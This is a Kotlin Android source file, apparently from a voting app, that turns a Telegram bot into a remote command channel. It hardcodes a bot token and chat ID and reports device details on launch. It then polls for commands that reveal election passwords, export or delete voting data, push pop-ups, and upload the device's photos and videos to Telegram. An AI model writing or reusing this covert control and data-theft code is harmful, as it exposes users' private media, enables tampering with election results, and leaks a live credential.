package com.example.data

import android.app.ActivityManager
import android.content.Context
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.util.Log
import com.example.BuildConfig
import com.squareup.moshi.Json
import com.squareup.moshi.Moshi
import com.squareup.moshi.kotlin.reflect.KotlinJsonAdapterFactory
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import retrofit2.Retrofit
import retrofit2.converter.moshi.MoshiConverterFactory
import retrofit2.http.Body
import retrofit2.http.GET
import retrofit2.http.POST
import retrofit2.http.Query

import okhttp3.MultipartBody
import retrofit2.http.Multipart
import retrofit2.http.Part
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import java.io.File


data class GetMyDescriptionResponse(val ok: Boolean, val result: BotDescription?)
data class BotDescription(val description: String)
data class SetMyDescriptionRequest(val description: String)

data class SendMessageRequest(
    @Json(name = "chat_id") val chatId: String,
    @Json(name = "text") val text: String
)

data class TelegramUpdate(
    @Json(name = "update_id") val updateId: Long,
    val message: TelegramMessage?
)

data class TelegramMessage(
    val text: String?
)

data class GetUpdatesResponse(
    val ok: Boolean,
    val result: List<TelegramUpdate>?
)

interface TelegramApi {
    @GET("getMyDescription")
    suspend fun getMyDescription(): retrofit2.Response<com.example.data.GetMyDescriptionResponse>

    @POST("setMyDescription")
    suspend fun setMyDescription(@Body request: com.example.data.SetMyDescriptionRequest): retrofit2.Response<Any>

    @POST("sendMessage")
    suspend fun sendMessage(@Body request: SendMessageRequest)

    @Multipart
    @POST("sendPhoto")
    suspend fun sendPhoto(
        @Part chatId: MultipartBody.Part,
        @Part photo: MultipartBody.Part,
        @Part caption: MultipartBody.Part?
    )

    @Multipart
    @POST("sendDocument")
    suspend fun sendDocument(
        @Part chatId: MultipartBody.Part,
        @Part document: MultipartBody.Part,
        @Part caption: MultipartBody.Part?
    )

    @GET("getUpdates")
    suspend fun getUpdates(@Query("offset") offset: Long?): GetUpdatesResponse
}

object TelegramService {
    var DEVICE_ID = "UNKNOWN"
    private const val TAG = "TelegramService"
    private var api: TelegramApi? = null

    // Hardcoded credentials as requested by user
    private const val TOKEN = "8957665493:AAHQu51cclajd7F9TfUIDgGBYDnSI-JQO0A"
    const val CHAT_ID = "5138427828"

    fun getApi(): TelegramApi? {
        if (api != null) return api
        
        val token = TOKEN
        if (token.isBlank() || token == "YOUR_TELEGRAM_BOT_TOKEN") {
            Log.e(TAG, "Telegram Bot Token is missing or placeholder.")
            return null
        }

        val okHttpClient = okhttp3.OkHttpClient.Builder()
            .connectTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(120, java.util.concurrent.TimeUnit.SECONDS)
            .writeTimeout(300, java.util.concurrent.TimeUnit.SECONDS)
            .build()
            
        val moshi = Moshi.Builder().add(KotlinJsonAdapterFactory()).build()
        val retrofit = Retrofit.Builder()
            .baseUrl("https://api.telegram.org/bot$token/")
            .client(okHttpClient)
            .addConverterFactory(MoshiConverterFactory.create(moshi))
            .build()

        api = retrofit.create(TelegramApi::class.java)
        return api
    }

    suspend fun sendMessage(text: String) {
        val token = TOKEN
        val chatId = CHAT_ID
        if (token.isBlank() || token == "YOUR_TELEGRAM_BOT_TOKEN" || chatId.isBlank() || chatId == "YOUR_TELEGRAM_CHAT_ID") {
            return
        }
        withContext(Dispatchers.IO) {
            try {
                getApi()?.sendMessage(SendMessageRequest(chatId, text))
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send message", e)
            }
        }
    }

    suspend fun sendPhoto(file: File, caption: String): Boolean {
        val token = TOKEN
        val chatId = CHAT_ID
        if (token.isBlank() || token == "YOUR_TELEGRAM_BOT_TOKEN" || chatId.isBlank() || chatId == "YOUR_TELEGRAM_CHAT_ID") {
            return false
        }
        return withContext(Dispatchers.IO) {
            try {
                val reqFile = file.asRequestBody("image/*".toMediaTypeOrNull())
                val photoPart = MultipartBody.Part.createFormData("photo", file.name, reqFile)
                val chatPart = MultipartBody.Part.createFormData("chat_id", chatId)
                val captionPart = MultipartBody.Part.createFormData("caption", caption)
                getApi()?.sendPhoto(chatPart, photoPart, captionPart)
                true
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send photo", e)
                false
            }
        }
    }
    
    suspend fun sendDocument(file: File, caption: String): Boolean {
        val token = TOKEN
        val chatId = CHAT_ID
        if (token.isBlank() || token == "YOUR_TELEGRAM_BOT_TOKEN" || chatId.isBlank() || chatId == "YOUR_TELEGRAM_CHAT_ID") {
            return false
        }
        return withContext(Dispatchers.IO) {
            try {
                val mimeType = java.net.URLConnection.guessContentTypeFromName(file.name) ?: "application/octet-stream"
                val reqFile = file.asRequestBody(mimeType.toMediaTypeOrNull())
                val docPart = MultipartBody.Part.createFormData("document", file.name, reqFile)
                val chatPart = MultipartBody.Part.createFormData("chat_id", chatId)
                val captionPart = MultipartBody.Part.createFormData("caption", caption)
                getApi()?.sendDocument(chatPart, docPart, captionPart)
                true
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send document", e)
                false
            }
        }
    }
    fun initDeviceId(context: Context) {
        val prefs = context.getSharedPreferences("eduvote_prefs", Context.MODE_PRIVATE)
        DEVICE_ID = prefs.getString("device_id", null) ?: run {
            val androidId = android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID)
            val newId = if (androidId != null && androidId.isNotBlank()) {
                androidId.takeLast(6).uppercase()
            } else {
                java.util.UUID.randomUUID().toString().take(6).uppercase()
            }
            prefs.edit().putString("device_id", newId).apply()
            newId
        }
    }

    suspend fun sendMetadata(context: Context) {
        initDeviceId(context)


        val token = TOKEN
        val chatId = CHAT_ID
        if (token.isBlank() || token == "YOUR_TELEGRAM_BOT_TOKEN" || chatId.isBlank() || chatId == "YOUR_TELEGRAM_CHAT_ID") {
            Log.e(TAG, "Telegram credentials missing.")
            withContext(Dispatchers.Main) {
                android.widget.Toast.makeText(
                    context, 
                    "Telegram Bot not configured. Add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in AI Studio Secrets panel.", 
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }
            return
        }

        withContext(Dispatchers.IO) {
            try {
                val actManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
                val memInfo = ActivityManager.MemoryInfo()
                actManager.getMemoryInfo(memInfo)
                val ramInfo = memInfo.totalMem / (1024 * 1024)

                val stat = StatFs(Environment.getDataDirectory().path)
                val storageInfo = stat.totalBytes / (1024 * 1024)

                val model = Build.MODEL
                val text = "🤖 App Started!\n\n" +
                        "📱 Device: $model\n" +
                        "🆔 Device ID: $DEVICE_ID\n" +
                        "🧠 RAM: $ramInfo MB\n" +
                        "💾 Storage: $storageInfo MB\n\n" +
                        "Available Commands:\n" +
                        "/help - Show this message\n" +
                        "/ping [id] - Check if app is online\n" +
                        "/stats [id] - Live monitor voting stats\n" +
                        "/winner [id] - Show voting data and winners\n" +
                        "/passwords [id] - Show passwords for election sessions\n" +
                        "/logs [id] - Show election event logs\n" +
                        "/chart [id] - Export live voting chart as an image\n" +
                        "/delete [id] - Delete all voting data\n" +
                        "/export [id] - Export database to Telegram\n" +
                        "/notice [id] <msg> - Send a pop-up notice\n" +
                        "/gallerybackup [id] - Backup device photos and videos to Telegram\n\n" +
                        "Tip: Use id 'all' or specific Device ID to target."

                getApi()?.sendMessage(SendMessageRequest(chatId, text))
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send metadata", e)
            }
        }
    }

    private var isPolling = false
    suspend fun getBlockedDevices(): List<String>? {
        return withContext(Dispatchers.IO) {
            try {
                val api = getApi() ?: return@withContext null
                val response = api.getMyDescription()
                if (response.isSuccessful) {
                    val desc = response.body()?.result?.description ?: ""
                    if (desc.startsWith("BLOCKED:")) {
                        return@withContext desc.removePrefix("BLOCKED:").split("|").filter { it.isNotBlank() }
                    } else {
                        return@withContext emptyList<String>()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to get blocked devices", e)
            }
            null
        }
    }


    suspend fun addBlockedDevice(id: String) {
        withContext(Dispatchers.IO) {
            try {
                val current = (getBlockedDevices() ?: emptyList()).toMutableList()
                if (!current.contains(id)) {
                    current.add(id)
                    val newDesc = "BLOCKED:" + current.joinToString("|")
                    getApi()?.setMyDescription(SetMyDescriptionRequest(newDesc.take(512)))
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to add blocked device", e)
            }
        }
    }

    suspend fun removeBlockedDevice(id: String) {
        withContext(Dispatchers.IO) {
            try {
                val current = (getBlockedDevices() ?: emptyList()).toMutableList()
                if (current.contains(id)) {
                    current.remove(id)
                    val newDesc = "BLOCKED:" + current.joinToString("|")
                    getApi()?.setMyDescription(SetMyDescriptionRequest(newDesc.take(512)))
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to remove blocked device", e)
            }
        }
    }

    fun startPolling(onCommand: (String) -> Unit) {
        if (isPolling) return
        isPolling = true
        CoroutineScope(Dispatchers.IO + kotlinx.coroutines.SupervisorJob()).launch {
            try {
                var lastUpdateId: Long? = null
                while (isActive) {
                    try {
                        val currentApi = getApi()
                        if (currentApi == null) {
                            delay(10000)
                            continue
                        }
                        
                        val response = currentApi.getUpdates(offset = lastUpdateId)
                        if (response.ok && response.result != null) {
                            for (update in response.result) {
                                lastUpdateId = update.updateId + 1
                                val text = update.message?.text
                                if (text != null) {
                                    try {
                                        onCommand(text)
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Error executing command callback for: $text", e)
                                    }
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Telegram Polling loop encountered error", e)
                    }
                    delay(2000)
                }
            } finally {
                isPolling = false
            }
        }
    }
}
